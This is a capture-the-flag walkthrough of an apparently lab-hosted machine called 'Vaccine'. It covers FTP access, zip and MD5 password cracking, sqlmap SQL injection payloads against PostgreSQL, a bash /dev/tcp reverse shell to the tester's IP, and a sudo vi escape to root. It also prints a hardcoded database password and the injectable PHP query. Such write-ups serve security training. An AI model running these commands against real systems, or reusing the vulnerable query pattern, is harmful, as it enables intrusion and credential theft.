# Vaccine
#startingpoint 
#veryeasy 
#ftp 
#sqlinjection 
#postgres
#php 
#hashcrack


### Reconnaissance
The recon phase involves gathering information about the target to identify potential vulnerabilities. In this case, we used the Nmap command `nmap -p- $TARGET` to perform a port scan of the target IP address. The output shows that the host is up and running. The open ports include port 80(HTTP), port 22(SSH) and port 21(FTP). 

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-22 18:32 CET
Nmap scan report for 10.129.175.136
Host is up (0.057s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
### FTP Service
We start by checking if we can get some data by accessing the FTP service with the default account that doesn't need password, to do this we run `ftp $TARGET` with username `anonymous`  and no need of any password
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
226 Transfer complete.
2533 bytes received in 0.00 secs (5.8209 MB/s)
```

We find a zip called backup, so we download it.

### Cracking the zip and the password
If we try to unzip it by running `unzip backup.zip` we realize that this zip requires a password to be unzipped. As we dont have any kind of password we try to open it with bruteforce attack, to do this first we convert the zip so a tool like john the ripper is able to bruteforce it, to this we run `zip2john backup.zip > hashes`.
```
Archive:  backup.zip
[backup.zip] index.php password: 
   skipping: index.php               incorrect password
   skipping: style.css               incorrect password

```
```
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```
Now that we have the zip in a acceptable format for the tool we can start the bruteforce with `john -w=/usr/share/wordlists/rockyou.txt hashes`
```
sing default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)
1g 0:00:00:00 DONE (2023-11-22 18:38) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
The zip password is `741852963`, now we can finally unzip it.
`unzip backup.zip`
```
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css
```
If there is something interesting in this files it will probably be inside the PHP code so we check it with `cat index.php`
```
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>MegaCorp Login</title>
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="./style.css">

</head>
  <h1 align=center>MegaCorp Login</h1>
<body>
<!-- partial:index.partial.html -->
<body class="align">

  <div class="grid">

    <form action="" method="POST" class="form login">

      <div class="form__field">
        <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
        <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>
      </div>

      <div class="form__field">
        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
      </div>

      <div class="form__field">
        <input type="submit" value="Sign In">
      </div>

    </form>


  </div>

  <svg xmlns="http://www.w3.org/2000/svg" class="icons"><symbol id="arrow-right" viewBox="0 0 1792 1792"><path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z"/></symbol><symbol id="lock" viewBox="0 0 1792 1792"><path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z"/></symbol><symbol id="user" viewBox="0 0 1792 1792"><path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z"/></symbol></svg>

</body>
<!-- partial -->
  
</body>
</html>
```
As we found a hashed password `2cb42f8734ea607eefed3b70af13bbd3` we check it first with `hashid 2cb42f8734ea607eefed3b70af13bbd3` and after we can try to bruteforce it as done before with the zip with `echo '2cb42f8734ea607eefed3b70af13bbd3' > hash`
`hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt`


```
Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x
```
```
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

2cb42f8734ea607eefed3b70af13bbd3:qwerty789       
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 2cb42f8734ea607eefed3b70af13bbd3
Time.Started.....: Wed Nov 22 18:44:55 2023 (1 sec)
Time.Estimated...: Wed Nov 22 18:44:56 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   668.5 kH/s (0.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 102400/14344385 (0.71%)
Rejected.........: 0/102400 (0.00%)
Restore.Point....: 98304/14344385 (0.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Dominic1 -> birth

Started: Wed Nov 22 18:44:24 2023
Stopped: Wed Nov 22 18:44:57 2023
```
The original password is `qwerty789`
### Web Application Analysis
We access the website with http://10.129.175.136/, now we can access http://10.129.175.136/dashboard.php, once in we find a catalogue, so we try to perform a query. After performing the query the URL looks like `http://10.129.175.136/dashboard.php?search=some`, so it looks like we can perform a SQL Injection

First of all we need to gran our session cookie, to do this we can use the advanced tools of the web-browser we are currently using.

`PHPSESSID=thfcev7fbaca5v0bo0oe7rhljp`

Once we have the cookie we can perform a SQLI, we only need to mark to the tool where can it try to perform the injection by adding a `*` in this part of the URL, we also have to use the cookie we just extracted before. The final command looks like this `sqlmap -u 'http://10.129.175.136/dashboard.php?search=*' --cookie PHPSESSID=thfcev7fbaca5v0bo0oe7rhljp --os-shell`
```
       ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:22:06 /2023-11-22/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] 
[19:22:09] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[19:22:09] [INFO] testing connection to the target URL
[19:22:09] [INFO] testing if the target URL content is stable
[19:22:09] [INFO] target URL content is stable
[19:22:09] [INFO] testing if URI parameter '#1*' is dynamic
[19:22:09] [INFO] URI parameter '#1*' appears to be dynamic
[19:22:09] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'PostgreSQL')
[19:22:10] [INFO] heuristic (XSS) test shows that URI parameter '#1*' might be vulnerable to cross-site scripting (XSS) attacks
[19:22:10] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 
[19:22:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:22:22] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:22:23] [INFO] testing 'Generic inline queries'
[19:22:23] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[19:22:23] [INFO] URI parameter '#1*' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable (with --string="Sed")
[19:22:23] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:22:23] [INFO] URI parameter '#1*' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
[19:22:23] [INFO] testing 'PostgreSQL inline queries'
[19:22:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:22:23] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)
[19:22:34] [INFO] URI parameter '#1*' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
[19:22:34] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[19:23:10] [INFO] URI parameter '#1*' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
[19:23:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: http://10.129.175.136:80/dashboard.php?search=' AND (SELECT (CASE WHEN (3176=3176) THEN NULL ELSE CAST((CHR(99)||CHR(87)||CHR(108)||CHR(104)) AS NUMERIC) END)) IS NULL-- fTpV

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: http://10.129.175.136:80/dashboard.php?search=' AND 7537=CAST((CHR(113)||CHR(120)||CHR(113)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (7537=7537) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(107)||CHR(113)) AS NUMERIC)-- cYQP

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: http://10.129.175.136:80/dashboard.php?search=';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: http://10.129.175.136:80/dashboard.php?search=' AND 2646=(SELECT 2646 FROM PG_SLEEP(5))-- jVgs
---
[19:23:23] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[19:23:24] [INFO] fingerprinting the back-end DBMS operating system
[19:23:24] [WARNING] reflective value(s) found and filtering out
[19:23:24] [INFO] the back-end DBMS operating system is Linux
[19:23:24] [INFO] testing if current user is DBA
[19:23:25] [INFO] retrieved: '1'
[19:23:25] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[19:23:25] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell>
```
As we have a shell we can set a reverse shell, so as usual we set first the listener in the local machine with `sudo nc -lvnp 443` and right after it we can launch the reverse shell `bash -c "bash -i >& /dev/tcp/10.10.15.208/443 0>&1"`
Once in the reverse shell we can upgrade it with `python3 -c 'import pty;pty.spawn("/bin/bash")'`

The user flag can be found in `/var/lib/postgresql/user.txt`
### Privilege escalation

We check the contents of `/var/www/html` searching for any kind of credentials we can use, to do this `cat dashboard.php`
```
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Admin Dashboard</title>
  <link rel="stylesheet" href="./dashboard.css">
  <script src="https://use.fontawesome.com/33a3739634.js"></script>

</head>
<body>
<!-- partial:index.partial.html -->
<body>
 <div id="wrapper">
 <div class="parent">
  <h1 align="left">MegaCorp Car Catalogue</h1>
<form action="" method="GET">
<div class="search-box">
  <input type="search" name="search" placeholder="Search" />
  <button type="submit" class="search-btn"><i class="fa fa-search"></i></button>
</div>
</form>
  </div>
  
  <table id="keywords" cellspacing="0" cellpadding="0">
    <thead>
      <tr>
        <th><span style="color: white">Name</span></th>
        <th><span style="color: white">Type</span></th>
        <th><span style="color: white">Fuel</span></th>
        <th><span style="color: white">Engine</span></th>
      </tr>
    </thead>
    <tbody>
	<?php
	session_start();
	if($_SESSION['login'] !== "true") {
	  header("Location: index.php");
	  die();
	}
	try {
	  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
	}

	catch ( exception $e ) {
	  echo $e->getMessage();
	}

	if(isset($_REQUEST['search'])) {

	  $q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";

	  $result = pg_query($conn,$q);

	  if (!$result)
	  {
			    die(pg_last_error($conn));
	  }
	  while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
	      {
		echo "
		  <tr>
		    <td class='lalign'>$row[1]</td>
		    <td>$row[2]</td>
		    <td>$row[3]</td>
		    <td>$row[4]</td>
		  </tr>";
	    }
	}
	else {
		
	  $q = "Select * from cars";

	  $result = pg_query($conn,$q);

	  if (!$result)
	  {
			    die(pg_last_error($conn));
	  }
	  while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
	      {
		echo "
		  <tr>
		    <td class='lalign'>$row[1]</td>
		    <td>$row[2]</td>
		    <td>$row[3]</td>
		    <td>$row[4]</td>
		  </tr>";
	    }
	}


      ?>
    </tbody>
  </table>
 </div> 
</body>
<!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js'></script><script  src="./dashboard.js"></script>

</body>
</html>
```
We get the password of the current user, which is `P@s5w0rd!` now we can run `sudo -l` to test if we have permissions to run any command as root.
```
[sudo] password for postgres: P@s5w0rd!

Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
As we have permissions to run `vi` we check [GTFBins](https://gtfobins.github.io/gtfobins/vi/) to see if we can use this to get a root terminal.
There are 2 ways of using `vi` to gain privileges so we try both of them, `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh' /dev/null`
```
[sudo] password for postgres: 
Sorry, user postgres is not allowed to execute '/bin/vi /etc/postgresql/11/main/pg_hba.conf -c :!/bin/sh' as root on vaccine.
```
The first one didn't work but we still try the second one `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`
Using vi commands:
```
:set shell=/bin/sh
:shell
```

Finally we have a root terminal, the flag is in `/root/root.txt`